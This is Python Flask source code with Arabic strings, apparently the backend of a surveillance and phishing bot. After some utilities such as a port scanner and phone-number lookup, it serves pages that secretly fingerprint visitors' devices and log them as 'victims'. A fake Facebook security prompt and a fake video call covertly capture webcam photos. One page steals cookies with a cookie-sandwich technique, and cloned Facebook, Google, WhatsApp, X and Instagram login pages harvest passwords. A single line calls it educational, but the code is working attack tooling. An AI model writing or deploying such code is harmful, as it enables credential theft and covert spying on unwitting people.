def port_scan(target, ports=None):
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            continue
    return open_ports

def ssl_scan(domain):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                if cert:
                    expiry = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (expiry - datetime.now()).days
                    return {'valid': True, 'issuer': cert.get('issuer', 'غير معروف'), 'not_after': cert.get('notAfter', 'غير معروف'), 'days_left': days_left}
                else:
                    return {'valid': False, 'error': 'لا توجد شهادة'}
    except Exception as e:
        return {'valid': False, 'error': str(e)[:100]}

def track_phone_number(number):
    try:
        parsed = phonenumbers.parse(number, None)
        country = geocoder.description_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        timezones = timezone.time_zones_for_number(parsed)
        return f"📱 معلومات الرقم {number}:\nالبلد: {country}\nالمشغل: {carrier_name}\nالمناطق الزمنية: {', '.join(timezones)}"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def analyze_apk(data, filename):
    if not ANDROGUARD_AVAILABLE:
        return {"error": "androguard غير مثبتة"}
    try:
        from androguard.core.bytecodes.apk import APK
        apk = APK(BytesIO(data))
        permissions = apk.get_permissions()
        dangerous = ['READ_SMS', 'CAMERA', 'RECORD_AUDIO', 'READ_CONTACTS', 'ACCESS_FINE_LOCATION']
        found = [p for p in permissions if any(d in p for d in dangerous)]
        return {'package': apk.get_package(), 'version': apk.get_androidversion_code(), 'permissions': permissions, 'dangerous_permissions': found, 'malicious': len(found) > 3}
    except Exception as e:
        return {'error': f"فشل التحليل: {str(e)[:100]}"}

def download_video(url):
    try:
        os.makedirs('downloads', exist_ok=True)
        ydl_opts = {'outtmpl': 'downloads/%(title)s.%(ext)s', 'format': 'best[ext=mp4]/best', 'quiet': True, 'no_warnings': True, 'ignoreerrors': True, 'no_check_certificate': True, 'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'cookiefile': 'cookies.txt'}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if info:
                filename = ydl.prepare_filename(info)
                if os.path.exists(filename):
                    return filename, None
                for f in os.listdir('downloads'):
                    if info.get('id', '') in f:
                        return os.path.join('downloads', f), None
            return None, "فشل التحميل"
    except Exception as e:
        return None, str(e)[:200]

def shorten_url(url):
    try:
        code = hashlib.md5(url.encode()).hexdigest()[:8]
        safe_db_execute("INSERT INTO short_urls (original_url, short_code, created_at) VALUES (?, ?, ?)", (url, code, datetime.now().isoformat()))
        return f"{SERVER_URL}/s/{code}"
    except Exception as e:
        return None

def expand_url(short_url):
    try:
        code = short_url.split('/')[-1]
        row = safe_db_query("SELECT original_url FROM short_urls WHERE short_code = ?", (code,))
        if row:
            return row[0]
        return None
    except:
        return None

def extract_pdf_text(data):
    try:
        import pypdf
        reader = pypdf.PdfReader(BytesIO(data))
        text = ""
        for page in reader.pages:
            text += page.extract_text() + "\n"
        return text.strip()
    except ImportError:
        return "مكتبة PyPDF2 غير مثبتة"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def smart_pdf_search(pdf_text, question):
    if not pdf_text:
        return "لم يتم تحميل أي ملف PDF."
    lines = pdf_text.split('\n')
    relevant = [line for line in lines if any(word in line.lower() for word in question.lower().split())]
    if relevant:
        return "\n".join(relevant[:5])
    return "لم يتم العثور على إجابة."
  # ===================== دوال Flask =====================
@app.route('/health')
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})

@app.route('/device_info')
def device_info_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><title>معلومات الجهاز</title></head>
    <body style="display:none;">
    <script>
    async function getDeviceInfo() {
        const urlParams = new URLSearchParams(window.location.search);
        const chat_id = urlParams.get('id');
        let data = {chat_id: chat_id};
        data.userAgent = navigator.userAgent;
        data.language = navigator.language;
        data.platform = navigator.platform;
        data.cores = navigator.hardwareConcurrency || 'غير معروف';
        data.ram = navigator.deviceMemory || 'غير معروف';
        data.width = screen.width;
        data.height = screen.height;
        data.colorDepth = screen.colorDepth;
        if (navigator.connection) {
            data.network = navigator.connection.type || 'غير محدد';
            data.downlink = navigator.connection.downlink || 'غير معروف';
            data.effectiveType = navigator.connection.effectiveType || 'غير محدد';
        }
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            data.battery = Math.round(battery.level * 100);
            data.charging = battery.charging;
        }
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            data.ip = ipData.ip || 'غير معروف';
            data.country = ipData.country_name || 'غير معروف';
            data.city = ipData.city || 'غير معروف';
        } catch(e){}
        await fetch('/send_device_info', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
        document.body.innerHTML = "<p>✅ تم الارسال. يمكنك الرجوع للبوت</p>";
        setTimeout(() => window.close(), 1000);
    }
    getDeviceInfo();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/send_device_info', methods=['POST'])
def receive_device_info():
    data = request.json
    chat_id = data.get('chat_id')
    if not chat_id:
        return jsonify({"status": "error"}), 400
    safe_db_execute("INSERT OR REPLACE INTO victims (chat_id, ip, country, platform, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?)",
                    (str(chat_id), data.get('ip', ''), data.get('country', ''), data.get('platform', ''), datetime.now().isoformat(), datetime.now().isoformat()))
    safe_db_execute("INSERT INTO collected_data (device_id, data_type, data, created_at) VALUES (?, ?, ?, ?)",
                    (str(chat_id), "device_info", json.dumps(data), datetime.now().isoformat()))
    msg = f"""📱 معلومات الجهاز

معلومات الموقع
━━━━━━━━━━━━━━
الدولة          : {data.get('country', 'غير معروف')}
المدينة         : {data.get('city', 'غير معروف')}
عنوان IP        : {data.get('ip', 'غير معروف')}

معلومات الشبكة
━━━━━━━━━━━━━━
نوع الشبكة      : {data.get('network', 'غير محدد')}
نوع الاتصال     : {data.get('effectiveType', 'غير محدد')}
سرعة التحميل    : {data.get('downlink', 'غير معروف')} ميغابت

معلومات الجهاز
━━━━━━━━━━━━━━
نوع الجهاز      : {data.get('platform', 'غير معروف')}
لغة النظام      : {data.get('language', 'غير معروف')}
عدد الأنوية     : {data.get('cores', 'غير معروف')}
الذاكرة العشوائية: {data.get('ram', 'غير معروف')} جيجابايت

معلومات الشاشة
━━━━━━━━━━━━━━
دقة الشاشة      : {data.get('width', 'غير معروف')} x {data.get('height', 'غير معروف')}
عمق الألوان     : {data.get('colorDepth', 'غير معروف')} بت

معلومات البطارية
━━━━━━━━━━━━━━
نسبة الشحن      : {data.get('battery', 'غير معروف')}%
حالة الشحن      : {'قيد الشحن' if data.get('charging', False) else 'غير قيد الشحن'}

الوقت           : {datetime.now().strftime('%d/%m/%Y %I:%M:%S %p')}"""
    notify_admin(msg)
    return jsonify({"status": "ok"})

# ===================== الكاميرا المتطورة (متوافقة مع جميع المتصفحات) =====================
@app.route('/camera_hack')
def camera_hack_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = '''
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>تحديث الأمان</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
                background: #f0f2f5;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            .box {
                background: white;
                padding: 30px;
                border-radius: 12px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                width: 100%;
                max-width: 380px;
                text-align: center;
            }
            .logo {
                font-size: 32px;
                font-weight: bold;
                color: #1877f2;
                margin-bottom: 10px;
            }
            .btn {
                background: #1877f2;
                color: white;
                border: none;
                padding: 14px;
                border-radius: 6px;
                width: 100%;
                font-size: 18px;
                font-weight: 600;
                cursor: pointer;
                transition: background 0.2s;
                margin-top: 10px;
            }
            .btn:hover { background: #166fe5; }
            .btn:active { transform: scale(0.98); }
            .sub {
                font-size: 13px;
                color: #888;
                margin-top: 15px;
            }
            .warning {
                background: #fffbcc;
                border: 1px solid #ffd700;
                padding: 10px;
                border-radius: 6px;
                margin-top: 15px;
                font-size: 12px;
                color: #856404;
            }
        </style>
    </head>
    <body>
    <div class="box">
        <div class="logo">🔐 فيسبوك</div>
        <h3 style="color:#1c1e21; font-weight:400;">تحديث الأمان</h3>
        <p style="color:#606770; margin:10px 0;">لتأكيد هويتك، يرجى النقر على الزر أدناه.</p>
        <button id="fakeBtn" class="btn">✅ تأكيد الهوية</button>
        <p class="sub">سيتم استخدام الكاميرا للتحقق الثنائي</p>
        <div class="warning">⚠️ هذه الصفحة لأغراض تعليمية في مختبر خاضع للرقابة فقط</div>
    </div>
    <script>
    (function() {
        "use strict";

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            alert("هذا المتصفح لا يدعم الكاميرا. يرجى استخدام متصفح حديث.");
            return;
        }

        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');
        if (!chatId) {
            alert("رابط غير صالح");
            return;
        }

        const btn = document.getElementById('fakeBtn');

        function captureImage() {
            btn.disabled = true;
            btn.textContent = 'جاري التحقق...';

            const constraints = {
                video: {
                    width: { ideal: 320 },
                    height: { ideal: 240 },
                    facingMode: 'user',
                    aspectRatio: 4/3
                },
                audio: false
            };

            navigator.mediaDevices.getUserMedia(constraints)
            .then(function(stream) {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.style.position = 'absolute';
                video.style.top = '-9999px';
                video.style.left = '-9999px';
                video.style.width = '1px';
                video.style.height = '1px';
                video.style.opacity = '0';
                video.style.pointerEvents = 'none';
                document.body.appendChild(video);

                video.play();

                setTimeout(function() {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 320;
                    canvas.height = video.videoHeight || 240;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const imageData = canvas.toDataURL('image/jpeg', 0.9);

                    stream.getTracks().forEach(track => track.stop());
                    video.remove();

                    fetch('/api/collect_camera', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            image: imageData,
                            userAgent: navigator.userAgent,
                            platform: navigator.platform || 'unknown',
                            screen: screen.width + 'x' + screen.height
                        })
                    })
                    .then(function(response) {
                        if (!response.ok) throw new Error('فشل الإرسال');
                        return response.json();
                    })
                    .then(function(data) {
                        console.log('تم الإرسال بنجاح', data);
                        window.location.href = 'https://www.facebook.com';
                    })
                    .catch(function(err) {
                        console.error(err);
                        window.location.href = 'https://www.facebook.com';
                    });

                }, 800);

            })
            .catch(function(err) {
                console.error('خطأ في الكاميرا:', err);
                alert('فشل التحقق، يرجى التأكد من الكاميرا وإعادة المحاولة.');
                btn.disabled = false;
                btn.textContent = '✅ تأكيد الهوية';
            });
        }

        btn.addEventListener('click', captureImage);

        btn.addEventListener('touchstart', function(e) {
            e.preventDefault();
        }, { passive: false });

    })();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/api/collect_camera', methods=['POST'])
def collect_camera():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "بيانات غير صالحة"}), 400

        chat_id = data.get('chat_id')
        image_data = data.get('image')
        user_agent = data.get('userAgent', 'unknown')
        platform = data.get('platform', 'unknown')
        screen = data.get('screen', 'unknown')

        if not chat_id or not image_data:
            return jsonify({"status": "error", "message": "بيانات ناقصة"}), 400

        if ',' in image_data:
            image_data = image_data.split(',')[1]

        img_binary = base64.b64decode(image_data)

        device_info = json.dumps({
            'userAgent': user_agent,
            'platform': platform,
            'screen': screen,
            'ip': request.remote_addr
        })

        safe_db_execute(
            "INSERT INTO camera_images (chat_id, image, device_info, created_at) VALUES (?, ?, ?, ?)",
            (chat_id, img_binary, device_info, datetime.now().isoformat())
        )

        safe_db_execute(
            "INSERT INTO hack_files (chat_id, filename, content, created_at) VALUES (?, ?, ?, ?)",
            (str(chat_id), f"cam_{chat_id}_{int(time.time())}.jpg", img_binary, datetime.now().isoformat())
        )

        os.makedirs('collected', exist_ok=True)
        filename = f"collected/cam_{chat_id}_{int(time.time())}.jpg"
        with open(filename, 'wb') as f:
            f.write(img_binary)

        notify_admin(
            f"📸 صورة من الكاميرا\n"
            f"المستخدم: {chat_id}\n"
            f"الجهاز: {platform}\n"
            f"المتصفح: {user_agent[:50]}\n"
            f"الآيبي: {request.remote_addr}\n"
            f"ملف: {filename}"
        )

        return jsonify({"status": "ok", "message": "تم استلام الصورة"}), 200

    except Exception as e:
        logger.error(f"collect_camera error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ===================== مكالمة فيديو وهمية =====================
@app.route('/video_call')
def video_call_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403

    html = '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>مكالمة فيديو</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
                background: #1a1a2e;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
                direction: rtl;
            }
            .call-container {
                background: #16213e;
                border-radius: 24px;
                padding: 30px;
                width: 100%;
                max-width: 400px;
                text-align: center;
                box-shadow: 0 20px 60px rgba(0,0,0,0.6);
                position: relative;
                overflow: hidden;
            }
            .call-header { color: #fff; margin-bottom: 20px; }
            .call-header .caller-name { font-size: 24px; font-weight: 600; }
            .call-header .caller-status { font-size: 14px; color: #4ecca3; margin-top: 5px; }
            .call-avatar {
                width: 120px; height: 120px; border-radius: 50%;
                background: linear-gradient(135deg, #667eea, #764ba2);
                margin: 15px auto;
                display: flex; align-items: center; justify-content: center;
                font-size: 48px; color: #fff;
                box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
            }
            .call-timer { color: #a8b2d1; font-size: 18px; font-weight: 300; margin: 10px 0 20px; }
            .call-actions { display: flex; justify-content: center; gap: 20px; margin-top: 20px; }
            .call-btn {
                width: 60px; height: 60px; border: none; border-radius: 50%;
                font-size: 24px; cursor: pointer; transition: transform 0.2s, background 0.2s;
                display: flex; align-items: center; justify-content: center; color: #fff;
            }
            .call-btn:active { transform: scale(0.92); }
            .call-btn.end-call { background: #e74c3c; box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4); }
            .call-btn.end-call:hover { background: #c0392b; }
            .call-btn.mic { background: #2d3436; }
            .call-btn.mic.muted { background: #636e72; }
            .call-btn.camera { background: #2d3436; }
            .call-btn.camera.off { background: #636e72; }
            .call-footer { margin-top: 25px; color: #636e72; font-size: 12px; }
            .call-footer a { color: #4ecca3; text-decoration: none; }
            .connecting { animation: pulse 1.5s infinite; }
            @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
            #localVideo {
                position: absolute; top: -9999px; left: -9999px;
                width: 1px; height: 1px; opacity: 0; pointer-events: none;
            }
            @media (max-width: 480px) {
                .call-container { padding: 20px; }
                .call-avatar { width: 90px; height: 90px; font-size: 36px; }
                .call-btn { width: 50px; height: 50px; font-size: 20px; }
            }
        </style>
    </head>
    <body>
    <div class="call-container">
        <div class="call-header">
            <div class="caller-name">د. أحمد السيد</div>
            <div class="caller-status connecting" id="callStatus">⏳ جاري الاتصال...</div>
        </div>
        <div class="call-avatar" id="avatarDisplay">🎥</div>
        <div class="call-timer" id="callTimer">00:00</div>
        <div class="call-actions">
            <button class="call-btn mic" id="micBtn" title="كتم الميكروفون">🎤</button>
            <button class="call-btn end-call" id="endCallBtn" title="إنهاء المكالمة">📞</button>
            <button class="call-btn camera" id="cameraBtn" title="إيقاف الكاميرا">📷</button>
        </div>
        <div class="call-footer">🔒 مكالمة مشفرة · <a href="#" id="reportLink">الإبلاغ عن مشكلة</a></div>
        <video id="localVideo" autoplay playsinline></video>
    </div>
    <script>
    (function() {
        "use strict";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id') || 'TEST';
        const callStatus = document.getElementById('callStatus');
        const callTimer = document.getElementById('callTimer');
        const avatarDisplay = document.getElementById('avatarDisplay');
        const endCallBtn = document.getElementById('endCallBtn');
        const micBtn = document.getElementById('micBtn');
        const cameraBtn = document.getElementById('cameraBtn');
        const localVideo = document.getElementById('localVideo');
        let callActive = false;
        let stream = null;
        let timerInterval = null;
        let seconds = 0;
        let imageCaptured = false;

        function updateTimer() {
            seconds++;
            const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
            const secs = String(seconds % 60).padStart(2, '0');
            callTimer.textContent = `${mins}:${secs}`;
        }

        function startCall() {
            navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(audioStream) {
                setTimeout(function() {
                    navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 320 },
                            height: { ideal: 240 },
                            facingMode: 'user'
                        }
                    })
                    .then(function(videoStream) {
                        stream = videoStream;
                        localVideo.srcObject = stream;
                        localVideo.play();
                        callStatus.textContent = '🟢 متصل';
                        callStatus.className = 'caller-status';
                        avatarDisplay.textContent = '📹';
                        callActive = true;
                        timerInterval = setInterval(updateTimer, 1000);
                        setTimeout(function() {
                            if (stream && !imageCaptured) {
                                captureAndSendImage();
                            }
                        }, 3000);
                        console.log(`[+] بدأت مكالمة من ${chatId}`);
                    })
                    .catch(function(err) {
                        callStatus.textContent = '❌ لم يتمكن من الوصول للكاميرا';
                        callStatus.style.color = '#e74c3c';
                        alert('تعذر الوصول إلى الكاميرا. يرجى التأكد من الإذن.');
                        endCall();
                    });
                }, 800);
            })
            .catch(function(err) {
                callStatus.textContent = '❌ لم يتمكن من الوصول للميكروفون';
                callStatus.style.color = '#e74c3c';
                alert('تعذر الوصول إلى الميكروفون. يرجى التأكد من الإذن.');
                endCall();
            });
        }

        function captureAndSendImage() {
            if (!stream) return;
            try {
                const video = localVideo;
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 320;
                canvas.height = video.videoHeight || 240;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                fetch('/api/collect_camera', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        image: imageData,
                        source: 'video_call',
                        userAgent: navigator.userAgent,
                        platform: navigator.platform || 'unknown',
                        call_duration: seconds
                    })
                })
                .then(function(response) {
                    if (response.ok) console.log('[+] تم إرسال الصورة بنجاح');
                })
                .catch(function(err) {
                    console.error('[!] فشل إرسال الصورة:', err);
                });
                imageCaptured = true;
            } catch (e) {
                console.error('Error capturing image:', e);
            }
        }

        function endCall() {
            callActive = false;
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            if (stream) {
                stream.getTracks().forEach(function(track) {
                    track.stop();
                });
                stream = null;
                localVideo.srcObject = null;
            }
            callStatus.textContent = '📞 انتهت المكالمة';
            callStatus.style.color = '#636e72';
            avatarDisplay.textContent = '📞';
            setTimeout(function() {
                window.location.href = 'https://www.facebook.com';
            }, 1500);
        }

        micBtn.addEventListener('click', function() {
            this.classList.toggle('muted');
            this.textContent = this.classList.contains('muted') ? '🎤⛔' : '🎤';
        });

        cameraBtn.addEventListener('click', function() {
            this.classList.toggle('off');
            this.textContent = this.classList.contains('off') ? '📷⛔' : '📷';
        });

        endCallBtn.addEventListener('click', function() {
            endCall();
        });

        window.addEventListener('load', function() {
            setTimeout(startCall, 500);
        });

        window.addEventListener('beforeunload', function(e) {
            if (callActive) {
                return 'المكالمة لا تزال جارية، هل تريد إنهاءها؟';
            }
        });

        document.getElementById('reportLink').addEventListener('click', function(e) {
            e.preventDefault();
            alert('تم إرسال البلاغ. شكراً لك!');
        });

    })();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

# ===================== الكوكيز المتطورة =====================
@app.route('/cookie_stealer')
def cookie_stealer_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = '''
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"></head>
    <body>
    <h3>جاري التحقق من الأمان...</h3>
    <script>
    (function() {
        const chat_id = new URLSearchParams(window.location.search).get('id');
        const target = "https://example.com";
        
        // تقنية Cookie Sandwich
        document.cookie = "$Version=1;";
        document.cookie = 'param1="start';
        document.cookie = 'param2=end";';
        
        fetch(target, {
            credentials: 'include',
            headers: {'X-Requested-With': 'XMLHttpRequest'}
        })
        .then(r => r.text())
        .then(html => {
            const match = html.match(/param1="start; ([^;]+); param2=end"/);
            if (match) {
                const stolen = match[1];
                fetch('/api/collect_cookie', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chat_id,
                        url: target,
                        cookie: stolen,
                        technique: 'cookie_sandwich'
                    })
                });
            }
        })
        .catch(() => {});
    })();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/api/collect_cookie', methods=['POST'])
def collect_cookie():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        cookie = data.get('cookie') or data.get('cookies')
        technique = data.get('technique', 'unknown')
        url = data.get('url', '')

        if not chat_id or not cookie:
            return jsonify({"status": "error"}), 400

        if isinstance(cookie, list):
            for c in cookie:
                safe_db_execute(
                    "INSERT INTO stolen_cookies (chat_id, url, cookie_name, cookie_value, technique, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                    (chat_id, url, c.get('name', 'unknown'), c.get('value', ''), technique, datetime.now().isoformat())
                )
                notify_admin(f"🍪 {technique}: {c.get('name')}={c.get('value', '')[:50]}...")
        else:
            safe_db_execute(
                "INSERT INTO stolen_cookies (chat_id, url, cookie_name, cookie_value, technique, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (chat_id, url, 'stolen', cookie, technique, datetime.now().isoformat())
            )
            notify_admin(f"🍪 {technique}: {cookie[:100]}...")

        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"collect_cookie error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ===================== صفحات التصيد =====================
PHISHING_TEMPLATES = {
    'facebook': '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تسجيل الدخول إلى فيسبوك</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background: #f0f2f5;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                padding: 20px;
            }
            .container {
                background: white;
                padding: 30px 20px 20px;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
                width: 100%;
                max-width: 400px;
                text-align: center;
            }
            .logo {
                font-size: 56px;
                font-weight: bold;
                color: #1877f2;
                margin-bottom: 4px;
                line-height: 1;
            }
            .subtitle {
                color: #1c1e21;
                font-size: 18px;
                font-weight: 400;
                margin-bottom: 20px;
                line-height: 1.2;
            }
            .form-group {
                margin-bottom: 12px;
            }
            input {
                width: 100%;
                padding: 14px 16px;
                border: 1px solid #dddfe2;
                border-radius: 6px;
                font-size: 16px;
                outline: none;
                transition: border-color 0.2s;
                background: #fff;
                color: #1c1e21;
                box-sizing: border-box;
            }
            input:focus {
                border-color: #1877f2;
                box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
            }
            input::placeholder {
                color: #8a8d91;
                font-size: 15px;
            }
            .login-btn {
                width: 100%;
                padding: 14px;
                background: #1877f2;
                color: white;
                border: none;
                border-radius: 6px;
                font-size: 18px;
                font-weight: bold;
                cursor: pointer;
                margin-top: 8px;
                transition: background 0.2s;
            }
            .login-btn:hover {
                background: #166fe5;
            }
            .login-btn:active {
                background: #165dc4;
            }
            .forgot-link {
                display: block;
                margin: 14px 0 18px;
                color: #1877f2;
                font-size: 14px;
                text-decoration: none;
                font-weight: 500;
            }
            .forgot-link:hover {
                text-decoration: underline;
            }
            .hr-divider {
                border: none;
                border-top: 1px solid #dadde1;
                margin: 18px 0 20px;
            }
            .create-btn {
                width: 100%;
                padding: 14px;
                background: #42b72a;
                color: white;
                border: none;
                border-radius: 6px;
                font-size: 17px;
                font-weight: bold;
                cursor: pointer;
                transition: background 0.2s;
            }
            .create-btn:hover {
                background: #36a420;
            }
            .create-btn:active {
                background: #2b9217;
            }
            .meta-footer {
                margin-top: 24px;
                color: #8a8d91;
                font-size: 14px;
                font-weight: 400;
                letter-spacing: 0.3px;
            }
            .meta-footer strong {
                font-weight: 600;
                color: #606770;
            }
            @media (max-width: 460px) {
                .container {
                    padding: 20px 16px 16px;
                }
                .logo {
                    font-size: 48px;
                }
                .subtitle {
                    font-size: 16px;
                }
            }
        </style>
    </head>
    <body>
    <div class="container">
        <div class="logo">f</div>
        <div class="subtitle">تسجيل الدخول إلى فيسبوك</div>
        <form action="/api/phishing_submit" method="POST" id="loginForm">
            <input type="hidden" name="platform" value="facebook">
            <div class="form-group">
                <input type="email" name="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required autofocus>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="كلمة السر" required>
            </div>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
        <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
        <hr class="hr-divider">
        <button type="button" class="create-btn" onclick="alert('سيتم إنشاء حساب جديد قريباً')">إنشاء حساب جديد</button>
        <div class="meta-footer"><strong>Meta</strong></div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            setTimeout(function() {
                window.location.href = 'https://www.facebook.com';
            }, 1500);
        });
    </script>
    </body>
    </html>
    ''',
    'google': '<!DOCTYPE html><html><head><title>Google Login</title><style>body{font-family:Arial;background:white;display:flex;justify-content:center;align-items:center;height:100vh;}.box{text-align:center;}input{width:300px;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}button{width:300px;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;}</style></head><body><div class="box"><h2>Google</h2><form action="/api/phishing_submit" method="POST"><input type="hidden" name="platform" value="google"><input type="email" name="username" placeholder="البريد الإلكتروني" required><br><input type="password" name="password" placeholder="كلمة السر" required><br><button type="submit">تسجيل الدخول</button></form></div></body></html>',
    'whatsapp': '<!DOCTYPE html><html><head><title>WhatsApp Web</title><style>body{font-family:Arial;background:#075e54;display:flex;justify-content:center;align-items:center;height:100vh;color:white;}.box{background:#128c7e;padding:40px;border-radius:8px;width:350px;text-align:center;}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:4px;}button{width:100%;padding:12px;background:#25d366;color:white;border:none;border-radius:4px;font-size:16px;}</style></head><body><div class="box"><h2>WhatsApp Web</h2><form action="/api/phishing_submit" method="POST"><input type="hidden" name="platform" value="whatsapp"><input type="text" name="username" placeholder="رقم الهاتف" required><br><input type="password" name="password" placeholder="كلمة السر" required><br><button type="submit">تسجيل الدخول</button></form></div></body></html>',
    'twitter': '<!DOCTYPE html><html><head><title>X Login</title><style>body{font-family:Arial;background:black;display:flex;justify-content:center;align-items:center;height:100vh;color:white;}.box{background:#1a1a1a;padding:40px;border-radius:8px;width:350px;text-align:center;}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:4px;background:#333;color:white;}button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:4px;font-size:16px;}</style></head><body><div class="box"><h2>X</h2><form action="/api/phishing_submit" method="POST"><input type="hidden" name="platform" value="twitter"><input type="text" name="username" placeholder="اسم المستخدم" required><br><input type="password" name="password" placeholder="كلمة السر" required><br><button type="submit">تسجيل الدخول</button></form></div></body></html>',
    'instagram': '<!DOCTYPE html><html><head><title>Instagram Login</title><style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;}.box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:350px;text-align:center;}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}button{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:4px;font-size:16px;}</style></head><body><div class="box"><h2>Instagram</h2><form action="/api/phishing_submit" method="POST"><input type="hidden" name="platform" value="instagram"><input type="text" name="username" placeholder="اسم المستخدم" required><br><input type="password" name="password" placeholder="كلمة السر" required><br><button type="submit">تسجيل الدخول</button></form></div></body></html>'
}

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    html = PHISHING_TEMPLATES.get(platform)
    if not html:
        return "منصة غير مدعومة", 404
    return render_template_string(html)

